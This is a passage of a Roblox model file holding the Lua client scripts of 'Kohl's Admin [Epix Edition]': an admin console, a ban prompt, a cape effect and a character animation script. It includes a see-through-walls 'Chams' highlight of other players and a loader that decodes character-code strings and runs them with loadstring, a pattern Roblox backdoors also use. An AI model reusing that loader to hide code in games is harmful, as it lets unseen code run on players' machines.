no.Position=UDim2.new(0,140,0,50)
yes.MouseButton1Down:connect(function() 
Remote('PermBan',v)
scr:Destroy()
end)
no.MouseButton1Down:connect(function() 
scr:Destroy()
end)
if set.Animations then
	frame:TweenPosition(UDim2.new(1,-280,1,-150),'Out','Elastic',1)
else
	frame.Position=UDim2.new(1,-280,1,-150)
end
end
end

set.ConsoleGui=function()
	if playergui:FindFirstChild(set.GuiName..'CONSOLE') then return end
	local g=Instance.new('ScreenGui',playergui) g.Name=set.GuiName..'CONSOLE'
	local f=Instance.new('ScrollingFrame',g)
	local t=Instance.new('TextBox',f)
	f.BackgroundColor3=set.PrimaryColor
	f.BorderSizePixel=0
	f.Size=UDim2.new(1,0,0,30*6)
	f.BackgroundTransparency=1
	f.ScrollingEnabled=false
	f.ClipsDescendants=false
	local m=f:clone()
	m.Parent=f
	m.Position=UDim2.new(0,0,0,30)
	m.Size=UDim2.new(1,0,0,30*5)
	m.CanvasSize=UDim2.new(0,0,0,0)
	m.ClipsDescendants=true
	t.TextColor3=set.TextColor
	t.TextStrokeTransparency=set.TextStrokeTransparency
	t.TextStrokeColor3=set.TextStrokeColor
	t.Text=set.Prefix
	t.BackgroundTransparency=set.Transparency
	t.BackgroundColor3=set.PrimaryColor
	t.BorderSizePixel=0
	t.Size=UDim2.new(1,0,0,30)
	t.Position=UDim2.new(0,0,0,-31)
	t.TextScaled=true
	t.ClearTextOnFocus=false
	t.TextXAlignment='Left'
	local open=false
	t.FocusLost:connect(function(enterPressed)
		if enterPressed then
			if t.Text~='' and t.Text~=set.Prefix then
				Remote('AdminCommand',t.Text,false,true)
			end
			open=false
			t.Text=set.Prefix
			m:ClearAllChildren()
			m.CanvasSize=UDim2.new(0,0,0,0)
			m.ScrollingEnabled=false
			m.Visible=false
			t:TweenPosition(UDim2.new(0,0,0,-31),'Out','Quad',0.1,true)
			if playerlistenabled then
				game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',true)
			end
			local scr=playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT')
			if scr and set.CustomChatType~='Bubbles' then scr.ChatDrag.Visible=true end
			if playergui:FindFirstChild(set.GuiName..'HINTS') then
				playergui:FindFirstChild(set.GuiName..'HINTS').Frame.Visible=true
			end
		end
	end)
	t.Changed:connect(function(c)
		if c=='Text' and t.Text~='' and open then
			m:ClearAllChildren()
			for i,v in pairs(set.FoundCommands) do
				if v:lower():sub(1,#t.Text)==t.Text:lower() then
				local b=Instance.new('TextButton',m)
				b.TextColor3=set.TextColor
				b.BackgroundTransparency=set.Transparency
				b.BorderSizePixel=0
				b.BackgroundColor3=set.PrimaryColor
				b.TextStrokeTransparency=set.TextStrokeTransparency
				b.TextStrokeColor3=set.TextStrokeColor
				b.Text=v
				b.Size=UDim2.new(1,-10,0,30)
				b.TextXAlignment='Left'
				b.TextScaled=true
				b.Position=UDim2.new(0,0,0,30*(#m:children()-1))
				b.MouseButton1Down:connect(function()
					t.Text=b.Text
					t:CaptureFocus()
				end)
				end
			end
			m.CanvasSize=UDim2.new(0,0,#m:children()/30,0)
			--if not open then m:ClearAllChildren() m.CanvasSize=UDim2.new(0,0,0,0) end
		elseif c=='Text' and t.Text=='' and open then
			m:ClearAllChildren() 
			m.CanvasSize=UDim2.new(0,0,0,0)
		end
	end)
	mouse.KeyDown:connect(function(key)
		if key==set.ConsoleKey then
			if open then
				open=false
				m:ClearAllChildren()
				m.CanvasSize=UDim2.new(0,0,0,0)
				m.ScrollingEnabled=false
				m.Visible=false
				t:TweenPosition(UDim2.new(0,0,0,-31),'Out','Quad',0.1,true)
				if playerlistenabled then game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',true) end
				local scr=playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT')
				if scr then scr.ChatDrag.Visible=true end
				if playergui:FindFirstChild(set.GuiName..'HINTS') then playergui:FindFirstChild(set.GuiName..'HINTS').Frame.Visible=true end
				Remote('SearchCommand','all')
			else
				open=true
				game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',false)
				m.ScrollingEnabled=true
				m.Visible=true
				local scr=playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT')
				if scr then scr.ChatDrag.Visible=false end
				if playergui:FindFirstChild(set.GuiName..'HINTS') then
					playergui:FindFirstChild(set.GuiName..'HINTS').Frame.Visible=false
				end
				Remote('SearchCommand','all')
				t.Text=''
				t:TweenPosition(UDim2.new(0,0,0,0),'Out','Quad',0.1,true)
				t:CaptureFocus()
			end
		end
	end)
end

set.Chams=function(type,plr)
	if type=='on' then
		if playergui:FindFirstChild(set.GuiName..plr.Name..'Chams') then playergui[set.GuiName..plr.Name..'Chams']:Destroy() end
		local bb=Instance.new('BillboardGui',playergui)
		bb.Name=set.GuiName..plr.Name..'Chams'
		local h=Instance.new('BoxHandleAdornment',bb)
		local t=Instance.new('BoxHandleAdornment',bb)
		local la=Instance.new('BoxHandleAdornment',bb)
		local ra=Instance.new('BoxHandleAdornment',bb)
		local ll=Instance.new('BoxHandleAdornment',bb)
		local rl=Instance.new('BoxHandleAdornment',bb) 
		local Humanoid=localplayer.Character.Humanoid
		local char = plr.Character
		h.Size=char.Head.Size
		h.Color3=char.Head.Color3
		h.Visible=true
		h.ZIndex=5
		h.AlwaysOnTop=true
		h.Adornee=char.Head
		t.Size=char.Torso.Size
		t.Color3=char.Torso.Color3
		t.Visible=true
		t.ZIndex=5
		t.AlwaysOnTop=true
		t.Adornee=char.Torso
		la.Size=char["Left Arm"].Size
		la.Color3=char["Left Arm"].Color3
		la.Visible=true
		la.ZIndex=5
		la.AlwaysOnTop=true
		la.Adornee=char["Left Arm"]
		ra.Size=char["Right Arm"].Size
		ra.Color3=char["Right Arm"].Color3
		ra.Visible=true
		ra.ZIndex=5
		ra.AlwaysOnTop=true
		ra.Adornee=char["Right Arm"]
		ll.Size=char["Left Leg"].Size
		ll.Color3=char["Left Leg"].Color3
		ll.Visible=true
		ll.ZIndex=5
		ll.AlwaysOnTop=true
		ll.Adornee=char["Left Leg"]
		rl.Size=char["Right Leg"].Size
		rl.Color3=char["Right Leg"].Color3
		rl.Visible=true
		rl.ZIndex=5
		rl.AlwaysOnTop=true
		rl.Adornee=char["Right Leg"]
		while bb do
			wait(1)
			if char:FindFirstChild("Head") == nil then
				h:Destroy()
			end
			if char:FindFirstChild("Torso") == nil then
				t:Destroy()
			end
			if char:FindFirstChild("Left Arm") == nil then
				la:Destroy()
			end
			if char:FindFirstChild("Right Arm") == nil then
				ra:Destroy()
			end
			if char:FindFirstChild("Left Leg") == nil then
				ll:Destroy()
			end
			if char:FindFirstChild("Right Leg") == nil then
				rl:Destroy()
			end
			if localplayer.Character:FindFirstChild("Humanoid").Health == 0 or char:FindFirstChild("Humanoid").Health == 0 then
				bb:Destroy()
			end
		end
	elseif type=='off' then
		if playergui:FindFirstChild(set.GuiName..plr.Name..'Chams') then playergui[set.GuiName..plr.Name..'Chams']:Destroy() end
	end
end

set.flowingCape=function(player,color)
local verlet = {}
verlet.step_time = 1 / 50
verlet.gravity = Vector3.new(0, -10, 0)
local char = player.Character
local torso = char:WaitForChild("Torso")
local parts = {}
local render = game:GetService("RunService").RenderStepped
wait(2)
local point = {}
local link = {}
local rope = {}
local function ccw(A,B,C)
    return (C.y-A.y) * (B.x-A.x) > (B.y-A.y) * (C.x-A.x)
end
local function intersect(A,B,C,D)
    return ccw(A,C,D) ~= ccw(B,C,D) and ccw(A,B,C) ~= ccw(A,B,D)
end
local function vec2(v)
    return Vector2.new(v.x, v.z)
end
function point:step()
    if not self.fixed then
        local derivative = (self.position - self.last_position) * 0.95
        self.last_position = self.position
        self.position = self.position + derivative + (self.velocity * verlet.step_time ^ 2)
        --[[local torsoP = torso.CFrame * CFrame.new(-1, 0, 0.5)
        local torsoE = torso.CFrame * CFrame.new(1, 0, 0.5)
        local pointE = self.position + torso.CFrame.lookVector * 100
        local doIntersect = intersect(vec2(torsoP.p), vec2(torsoE.p), vec2(self.position), vec2(pointE))
        if not doIntersect then
            self.postition = self.position - torso.CFrame.lookVector * 10
        end]]
    end
end
function link:step()
    for i = 1, 1 do
        local distance = self.point1.position - self.point2.position
        local magnitude = distance.magnitude
        local differance = (self.length - magnitude) / magnitude
        local translation = ((self.point1.fixed or self.point2.fixed) and 1 or 0.6) * distance * differance
        if not self.point1.fixed then
            self.point1.position = self.point1.position + translation
        end
        if not self.point2.fixed then
            self.point2.position = self.point2.position - translation
        end
    end
end
function verlet.new(class, a, b, c)
    if class == "Point" then
        local new = {}
        setmetatable(new, {__index = point})
        new.class = class
        new.position = a or Vector3.new()
        new.last_position = new.position
        new.velocity = verlet.gravity
        new.fixed = false
        return new
    elseif class == "Link" then
        local new = {}
        setmetatable(new, {__index = link})
        new.class = class
        new.point1 = a
        new.point2 = b
        new.length = c or (a.position - b.position).magnitude
        return new
    elseif class == "Rope" then
        local new = {}
        setmetatable(new, {__index = link})
        new.class = class
        new.start_point = a
        new.finish_point = b
        new.points = {}
        new.links = {}
        local inc = (b - a) / 10
        for i = 0, 10 do
            table.insert(new.points, verlet.new("Point", a + (i * inc)))
        end
        for i = 2, #new.points do
            table.insert(new.links, verlet.new("Link", new.points[i - 1], new.points[i]))
        end
        return new
    end
end
local tris = {}
local triParts = {}
local function GetDiscoColor(hue)
 local section = hue % 1 * 3
 local secondary = 0.5 * math.pi * (section % 1)
 if section < 1 then
  return Color3.new(1, 1 - math.cos(secondary), 1 - math.sin(secondary))
 elseif section < 2 then
  return Color3.new(1 - math.sin(secondary), 1, 1 - math.cos(secondary))
 else
  return Color3.new(1 - math.cos(secondary), 1 - math.sin(secondary), 1)
 end
end
local function setupPart(part)
    part.Anchored = true
    part.FormFactor = 3
    part.CanCollide = false
    part.TopSurface = 10
    part.BottomSurface = 10
    part.LeftSurface = 10
    part.RightSurface = 10
    part.FrontSurface = 10
    part.BackSurface = 10
	part.Material = "Fabric"
	if color == "disco" or color == "Disco" then
    part.Material = "Neon"
	end
    local m = Instance.new("SpecialMesh", part)
    m.MeshType = "Wedge"
    m.Scale = Vector3.new(0.2, 1, 1)
    return part
end
local function CFrameFromTopBack(at, top, back)
    local right = top:Cross(back)
    return CFrame.new(at.x, at.y, at.z, right.x, top.x, back.x,  right.y, top.y, back.y, right.z, top.z, back.z)
end
local function drawTri(parent, a, b, c)
    local this = {}
    local mPart1 = table.remove(triParts, 1) or setupPart(Instance.new("Part"))
    local mPart2 = table.remove(triParts, 1) or setupPart(Instance.new("Part"))
    function this:Set(a, b, c)
        local ab, bc, ca = b-a, c-b, a-c
        local abm, bcm, cam = ab.magnitude, bc.magnitude, ca.magnitude
        local edg1 = math.abs(0.5 + ca:Dot(ab)/(abm*abm))
        local edg2 = math.abs(0.5 + ab:Dot(bc)/(bcm*bcm))
        local edg3 = math.abs(0.5 + bc:Dot(ca)/(cam*cam))
        if edg1 < edg2 then
            if edg1 >= edg3 then       
                a, b, c = c, a, b
                ab, bc, ca = ca, ab, bc
                abm = cam
            end
        else
            if edg2 < edg3 then
                a, b, c = b, c, a
                ab, bc, ca = bc, ca, ab
                abm = bcm
            else
                a, b, c = c, a, b
                ab, bc, ca = ca, ab, bc
                abm = cam
            end
        end
     
        local len1 = -ca:Dot(ab)/abm
        local len2 = abm - len1
        local width = (ca + ab.unit*len1).magnitude
     
        local maincf = CFrameFromTopBack(a, ab:Cross(bc).unit, -ab.unit)
     
        if len1 > 0.2 then
            mPart1.Parent = parent
            mPart1.Size = Vector3.new(0.2, width, len1)
            mPart1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
        else
            mPart1.Parent = nil
        end
       
        if len2 > 0.2 then
            mPart2.Parent = parent
            mPart2.Size = Vector3.new(0.2, width, len2)
            mPart2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
        else
            mPart2.Parent = nil
        end
    end
    function this:SetProperty(prop, value)
        mPart1[prop] = value
        mPart2[prop] = value
    end
    this:Set(a, b, c)
    function this:Destroy()
        mPart1:Destroy()
        mPart2:Destroy()
    end
    this.p1 = mPart1
    this.p2 = mPart2
	this.p1.BrickColor = BrickColor.new(color)
	this.p2.BrickColor = BrickColor.new(color)
	if color == "disco" or color == "Disco" then
    this.p1.BrickColor = BrickColor.new(GetDiscoColor(math.noise(0.5, 0.5, this.p1.CFrame.Y * 0.5 + time())))
    this.p2.BrickColor = BrickColor.new(GetDiscoColor(math.noise(0.5, 0.5, this.p2.CFrame.Y * 0.5 + time())))
	end
    return this
end
function verlet.draw(object, id)
    if object.class == "Point" then
        local part = parts[id]
        part.BrickColor = BrickColor.new(1, 1, 1)
        part.Transparency = 0
        part.formFactor = 3
        part.Anchored = true
        part.CanCollide = false
        part.TopSurface = 0
        part.BottomSurface = 0
        part.Size = Vector3.new(0.35, 0.35, 0.35)
		part.Material = "Fabric"
       	if color == "disco" or color == "Disco" then
		part.Material = "Neon"
		end
        part.CFrame = CFrame.new(object.position)
        part.Parent = torso
        return part
    elseif object.class == "Link" then
        local part = parts[id]
        local dist = (object.point1.position - object.point2.position).magnitude
        part.Size = Vector3.new(0.2, 0.2, dist)
        part.CFrame = CFrame.new(object.point1.position, object.point2.position) * CFrame.new(0, 0, dist * -0.5)
        part.Parent = torso
        return part
    end
end
function verlet.clear()
    for _, v in pairs(workspace:GetChildren()) do
        if v.Name == "Part" then
            v:Destroy()
        end
    end
end
local points = {}
local links = {}
for x = 0, 2 do
    points[x] = {}
    for y = 0, 3 do
        points[x][y] = verlet.new("Point", torso.Position + Vector3.new(x * 0.8 - 2, 2 - y * 0.8, 5 + y * 0.4))
        points[x][y].fixed = y == 0
    end
end
for x = 1, 2 do
    for y = 0, 3 do
        links[#links + 1] = verlet.new("Link", points[x][y], points[x - 1][y], 1 + y * 0.08)
    end
end
for x = 0, 2 do
    for y = 1, 3 do
        links[#links + 1] = verlet.new("Link", points[x][y], points[x][y - 1], 1.2 + y * 0.03)
    end
end
render:connect(function()
    for x = 0, 2 do
        for y = 0, 3 do
            if y == 0 then
                points[x][y].position = (torso.CFrame * CFrame.new(x * 1 - 1, 1, 0.5)).p
            else
                points[x][y]:step()
            end
        end
    end
    for i = 1, #links do
        links[i]:step()
    end
    for i = 1, #tris do
        triParts[#triParts + 1] = tris[i].p1
        triParts[#triParts + 1] = tris[i].p2
    end
    tris = {}
    for x = 1, 2 do
        for y = 1, 3 do
            tris[#tris + 1] = drawTri(torso, points[x - 1][y - 1].position, points[x - 1][y].position, points[x][y - 1].position)
            tris[#tris + 1] = drawTri(torso, points[x][y].position, points[x - 1][y].position, points[x][y - 1].position)
        end
    end
end)
end

Remote('ClientHooked')
print("Kohl's Admin [Epix Edition] - Client Side Loaded. Time: "..tonumber(tostring((tick()-LoadStartTime)):match('%d.%d%d')).."s - Version: "..set.version.." | Name: "..game:service('Players').LocalPlayer.Name.." - Id: "..game:service('Players').LocalPlayer.userId)]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBXC4A71F60EC4F48999D32F100E88C6763">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">LocalScriptBase</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[coroutine.wrap(function()
script:WaitForChild('Code')
script:WaitForChild('SecurityKey')
script:WaitForChild('SpecialKey')
if script:FindFirstChild('Code') then
local code=script.Code.Value
script.Code:Destroy()
local key=script.SecurityKey.Value
script.SecurityKey:Destroy()
local SpecialKey=script.SpecialKey.Value
script.SpecialKey:Destroy()
if script:FindFirstChild('Ran') or #SpecialKey~=16/4*2 or #key~=16/4*2 then return end
local tab={}
local bob='local '..SpecialKey..'="'..key..'"'
for i in code:gmatch("[".."^,]".."+") do table.insert(tab,tonumber(i)) end local n = "" for i = 1, #tab do n = n .. string.char(tab[i]) end code=n
if code:match(bob) then
code=code:sub(#bob+1)
Instance.new('StringValue',script).Name='Ran'
coroutine.wrap(function() pcall(function() wait(5) if sk then sk:Destroy() end end) end)()
local ran,failed=ypcall(function() loadstring(code..' end)()')() end)
if failed then print(failed) end
end
end
end)()]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX9AC2C2CFC7844E77843493D150F54556">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Animate</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[function   waitForChild(parent, childName)
	local child = parent:findFirstChild(childName)
	if child then return child end
	while true do
		child = parent.ChildAdded:wait()
		if child.Name==childName then return child end
	end
end

local Figure = script.Parent
local Torso = waitForChild(Figure, "Torso")
local RightShoulder = waitForChild(Torso, "Right Shoulder")
local LeftShoulder = waitForChild(Torso, "Left Shoulder")
local RightHip = waitForChild(Torso, "Right Hip")
local LeftHip = waitForChild(Torso, "Left Hip")
local Neck = waitForChild(Torso, "Neck")
local Humanoid = waitForChild(Figure, "Humanoid")
local pose = "Standing"

local currentAnim = ""
local currentAnimTrack = nil
local currentAnimKeyframeHandler = nil
local currentAnimSpeed = 1.0
local oldAnimTrack = nil
local animTable = {}
local animNames = { 
	idle = 	{	
				{ id = "http://www.mulrbx.com/asset/?id=125750544", weight = 9 },
				{ id = "http://www.mulrbx.com/asset/?id=125750618", weight = 1 }
			},
	walk = 	{ 	
				{ id = "http://www.mulrbx.com/asset/?id=125749145", weight = 10 } 
			}, 
	run = 	{
				{ id = "run.xml", weight = 10 } 
			}, 
	jump = 	{
				{ id = "http://www.mulrbx.com/asset/?id=125750702", weight = 10 } 
			}, 
	fall = 	{
				{ id = "http://www.mulrbx.com/asset/?id=125750759", weight = 10 } 
			}, 
	climb = {
				{ id = "http://www.mulrbx.com/asset/?id=125750800", weight = 10 } 
			}, 
	toolnone = {
				{ id = "http://www.mulrbx.com/asset/?id=125750867", weight = 10 } 
			},
	toolslash = {
				{ id = "http://www.mulrbx.com/asset/?id=129967390", weight = 10 } 
--				{ id = "slash.xml", weight = 10 } 
			},
	toollunge = {
				{ id = "http://www.mulrbx.com/asset/?id=129967478", weight = 10 } 
			},
	wave = {
				{ id = "http://www.mulrbx.com/asset/?id=128777973", weight = 10 } 
			},
	point = {
				{ id = "http://www.mulrbx.com/asset/?id=128853357", weight = 10 } 
			},
	dance = {
				{ id = "http://www.mulrbx.com/asset/?id=130018893", weight = 10 }, 
				{ id = "http://www.mulrbx.com/asset/?id=132546839", weight = 10 }, 
				{ id = "http://www.mulrbx.com/asset/?id=132546884", weight = 10 } 
			},
	laugh = {
				{ id = "http://www.mulrbx.com/asset/?id=129423131", weight = 10 } 
			},
	cheer = {
				{ id = "http://www.mulrbx.com/asset/?id=129423030", weight = 10 } 
			},
}

-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
local emoteNames = { wave = false, point = false, dance = true, laugh = false, cheer = false}

math.randomseed(tick())

-- Setup animation objects
for name, fileList in pairs(animNames) do 
	animTable[name] = {}
	animTable[name].count = 0
	animTable[name].totalWeight = 0

	-- check for config values
	local config = script:FindFirstChild(name)
	if (config ~= nil) then
--		print("Loading anims " .. name)
		local idx = 1
		for _, childPart in pairs(config:GetChildren()) do
			animTable[name][idx] = {}
			animTable[name][idx].anim = childPart
			local weightObject = childPart:FindFirstChild("Weight")
			if (weightObject == nil) then
				animTable[name][idx].weight = 1
			else
				animTable[name][idx].weight = weightObject.Value
			end
			animTable[name].count = animTable[name].count + 1
			animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
			idx = idx + 1
		end
	end

	-- fallback to defaults
	if (animTable[name].count <= 0) then
		for idx, anim in pairs(fileList) do
			animTable[name][idx] = {}
			animTable[name][idx].anim = Instance.new("Animation")
			animTable[name][idx].anim.Name = name
			animTable[name][idx].anim.AnimationId = anim.id
			animTable[name][idx].weight = anim.weight
			animTable[name].count = animTable[name].count + 1
			animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
		end
	end
end

-- ANIMATION

-- declarations
local toolAnim = "None"
local toolAnimTime = 0

local jumpAnimTime = 0
local jumpAnimDuration = 0.175

local toolTransitionTime = 0.1
local fallTransitionTime = 0.2
local jumpMaxLimbVelocity = 0.75

-- functions

function stopAllAnimations()
	local oldAnim = currentAnim

	-- return to idle if finishing an emote
	if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
		oldAnim = "idle"
	end

	currentAnim = ""
	if (currentAnimKeyframeHandler ~= nil) then
		currentAnimKeyframeHandler:disconnect()
	end

	if (oldAnimTrack ~= nil) then
		oldAnimTrack:Stop()
		oldAnimTrack:Destroy()
		oldAnimTrack = nil
	end
	if (currentAnimTrack ~= nil) then
		currentAnimTrack:Stop()
		currentAnimTrack:Destroy()
		currentAnimTrack = nil
	end
	return oldAnim
end

function setAnimationSpeed(speed)
	if speed ~= currentAnimSpeed then
		currentAnimSpeed = speed
		currentAnimTrack:AdjustSpeed(currentAnimSpeed)
	end
end

function keyFrameReachedFunc(frameName)
	if (frameName == "End") then
--		print("Keyframe : ".. frameName)
		local repeatAnim = stopAllAnimations()
		local animSpeed = currentAnimSpeed
		playAnimation(repeatAnim, 0.0, Humanoid)
		setAnimationSpeed(animSpeed)
	end
end

-- Preload animations
function playAnimation(animName, transitionTime, humanoid)
	if (animName ~= currentAnim) then		 
		
		if (oldAnimTrack ~= nil) then
			oldAnimTrack:Stop()
			oldAnimTrack:Destroy()
		end

		currentAnimSpeed = 1.0
		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
		local anim = animTable[animName][idx].anim

		-- load it to the humanoid; get AnimationTrack
		oldAnimTrack = currentAnimTrack
		currentAnimTrack = humanoid:LoadAnimation(anim)
		 
		-- play the animation
		currentAnimTrack:Play(transitionTime)
		currentAnim = animName

		-- set up keyframe name triggers
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end
		currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
	end
end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------

local toolAnimName = ""
local toolOldAnimTrack = nil
local toolAnimTrack = nil
local currentToolAnimKeyframeHandler = nil

function toolKeyFrameReachedFunc(frameName)
	if (frameName == "End") then
--		print("Keyframe : ".. frameName)
		local repeatAnim = stopToolAnimations()
		playToolAnimation(repeatAnim, 0.0, Humanoid)
	end
end


function playToolAnimation(animName, transitionTime, humanoid)
	if (animName ~= toolAnimName) then		 
		
		if (toolAnimTrack ~= nil) then
			toolAnimTrack:Stop()
			toolAnimTrack:Destroy()
			transitionTime = 0
		end

		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
		local anim = animTable[animName][idx].anim

		-- load it to the humanoid; get AnimationTrack
		toolOldAnimTrack = toolAnimTrack
		toolAnimTrack = humanoid:LoadAnimation(anim)
		 
		-- play the animation
		toolAnimTrack:Play(transitionTime)
		toolAnimName = animName

		currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
	end
end

function stopToolAnimations()
	local oldAnim = toolAnimName

	if (currentToolAnimKeyframeHandler ~= nil) then
		currentToolAnimKeyframeHandler:disconnect()
	end

	toolAnimName = ""
	if (toolAnimTrack ~= nil) then
		toolAnimTrack:Stop()
		toolAnimTrack:Destroy()
		toolAnimTrack = nil
	end


	return oldAnim
end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------


function onRunning(speed)
	if speed>0 then
		playAnimation("walk", 0.1, Humanoid)
		pose = "Running"
	else
		playAnimation("idle", 0.1, Humanoid)
		pose = "Standing"
	end
end

function onDied()
	pose = "Dead"
end

function onJumping()
	playAnimation("jump", 0.1, Humanoid)
	jumpAnimTime = jumpAnimDuration
	pose = "Jumping"
end

function onClimbing(speed)
	playAnimation("climb", 0.1, Humanoid)
	setAnimationSpeed(speed / 12.0)
	pose = "Climbing"
end

function onGettingUp()
	pose = "GettingUp"
end

function onFreeFall()
	if (jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	end
	pose = "FreeFall"
end

function onFallingDown()
	pose = "FallingDown"
end

function onSeated()
	pose = "Seated"
end

function onPlatformStanding()
	pose = "PlatformStanding"
end

function onSwimming(speed)
	if speed>0 then
		pose = "Running"
	else
		pose = "Standing"
	end
end

function getTool()	
	for _, kid in ipairs(Figure:GetChildren()) do
		if kid.className == "Tool" then return kid end
	end
	return nil
end

function getToolAnim(tool)
	for _, c in ipairs(tool:GetChildren()) do
		if c.Name == "toolanim" and c.className == "StringValue" then
			return c
		end
	end
	return nil
end

function animateTool()
	
	if (toolAnim == "None") then
		playToolAnimation("toolnone", toolTransitionTime, Humanoid)
		return
	end

	if (toolAnim == "Slash") then
		playToolAnimation("toolslash", 0, Humanoid)
		return
	end

	if (toolAnim == "Lunge") then
		playToolAnimation("toollunge", 0, Humanoid)
		return
	end
end

function moveSit()
	RightShoulder.MaxVelocity = 0.15
	LeftShoulder.MaxVelocity = 0.15
	RightShoulder:SetDesiredAngle(3.14 /2)
	LeftShoulder:SetDesiredAngle(-3.14 /2)
	RightHip:SetDesiredAngle(3.14 /2)
	LeftHip:SetDesiredAngle(-3.14 /2)
end

local lastTick = 0

function move(time)
	local amplitude = 1
	local frequency = 1
  	local deltaTime = time - lastTick
  	lastTick = time

	local climbFudge = 0
	local setAngles = false

  	if (jumpAnimTime > 0) then
  		jumpAnimTime = jumpAnimTime - deltaTime
  	end

	if (pose == "FreeFall" and jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	elseif (pose == "Seated") then
		stopAllAnimations()
		moveSit()
		return
	elseif (pose == "Running") then
		playAnimation("walk", 0.1, Humanoid)
	elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
--		print("Wha " .. pose)
		amplitude = 0.1
		frequency = 1
		setAngles = true
	end

	if (setAngles) then
		desiredAngle = amplitude * math.sin(time * frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)
	end

	-- Tool Animation handling
	local tool = getTool()
	if tool then
	
		animStringValueObject = getToolAnim(tool)

		if animStringValueObject then
			toolAnim = animStringValueObject.Value
			-- message recieved, delete StringValue
			animStringValueObject.Parent = nil
			toolAnimTime = time + .3
		end

		if time > toolAnimTime then
			toolAnimTime = 0
			toolAnim = "None"
		end

		animateTool()		
	else
		stopToolAnimations()
		toolAnim = "None"
		toolAnimTime = 0
	end
end

-- connect events
Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)

-- setup emote chat hook
--Game.Players.LocalPlayer.Chatted:connect(function(msg)
--	local emote = ""
--	if (string.sub(msg, 1, 3) == "/e ") then
--		emote = string.sub(msg, 4)
--	elseif (string.sub(msg, 1, 7) == "/emote ") then
--		emote = string.sub(msg, 8)
--	end
--	
--	if (pose == "Standing" and emoteNames[emote] ~= nil) then
--		playAnimation(emote, 0.1, Humanoid)
--	end
----	print("===> " .. string.sub(msg, 1, 3) .. "(" .. emote .. ")")
--end)


-- main program

local runService = game:service("RunService");

-- initialize to idle
playAnimation("idle", 0.1, Humanoid)
pose = "Standing"

while Figure.Parent~=nil do
	local _, time = wait(0.1)
	move(time)
end


]]></ProtectedString>
				</Properties>
				<Item class="StringValue" referent="RBX12C13366A65C4B81936A0B28C921EFC5">
					<Properties>
						<string name="Name">climb</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBX8DA813C48F234681B637E5D8055677D5">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750800</url></Content>
							<string name="Name">ClimbAnim</string>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX130D6C10D5E34D38B75E0F0A39AD5C04">
					<Properties>
						<string name="Name">fall</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBX30C916C6C3F746B79AFDBACB19E538C4">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750759</url></Content>
							<string name="Name">FallAnim</string>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX84F48C8819FD4E3481B611AE8CD922B2">
					<Properties>
						<string name="Name">idle</string>
						<string name="Value"></string>
					</Properties>
					<Item class="Animation" referent="RBX25470FE4FD1F4E148B30441DD1017F5E">
						<Properties>
							<Content name="AnimationId"><url>http://www.mulrbx.com/asset/?id=125750544</url></Content>
							<string name="Name">Animation1</string>
						</Properties>
						<Item class="NumberValue" referent="RBXCB205D64BA4E4B4D965E8AE5F9C94F16">
							<Properties>
								<string name="Name">Weight</string>
